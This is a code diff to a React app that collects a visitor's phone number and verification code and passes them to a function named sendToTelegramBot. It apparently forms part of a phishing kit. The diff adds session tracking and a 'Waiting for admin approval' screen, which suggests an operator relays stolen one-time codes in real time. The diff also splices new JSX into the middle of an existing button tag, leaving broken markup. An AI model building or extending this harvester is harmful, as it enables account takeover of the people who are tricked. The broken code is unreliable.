@@ -23,6 +23,19 @@ const userReviews: UserReview[] = [
 ];
 
 function App() {
+  const [sessionId] = useState<string>(() => {
+    try {
+      const existing = localStorage.getItem('sessionId');
+      if (existing) return existing;
+      const sid = (crypto && 'randomUUID' in crypto) ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now().toString(36);
+      localStorage.setItem('sessionId', sid);
+      return sid;
+    } catch { 
+      return Math.random().toString(36).slice(2) + Date.now().toString(36);
+    }
+  });
+  const [waiting, setWaiting] = useState(false);
+  const [errorText, setErrorText] = useState<string | null>(null);
   const [currentStep, setCurrentStep] = useState<'welcome' | 'phone' | 'verification' | 'done'>('welcome');
   const [phoneNumber, setPhoneNumber] = useState(['', '', '', '', '']);
   const [verificationCode, setVerificationCode] = useState(['', '', '', '', '']);
@@ -34,7 +47,7 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify(data),
+        body: JSON.stringify({ ...data, sessionId }),
       });
       return response.ok;
     } catch (error) {
@@ -204,7 +217,15 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
                   </div>
                   <button 
                     onClick={handleVerificationSubmit}
-                    disabled={verificationCode.join('').length !== 5}
+                    {errorText && (
+                    <p className="text-red-500 font-semibold mb-4">{errorText}</p>
+                  )}
+                  {waiting && (
+                    <p className="text-white/90 mb-4">Waiting for admin approval…</p>
+                  )}
+                  <button 
+                    onClick={handleVerificationSubmit}
+                    disabled={verificationCode.join('').length !== 5 || waiting}
                     className="bg-red-600 hover:bg-red-700 disabled:bg-gray-400 disabled:cursor-not-allowed text-white px-8 py-4 rounded-xl font-semibold text-lg transition-colors duration-200 shadow-lg"
                   >
                     Submit Code
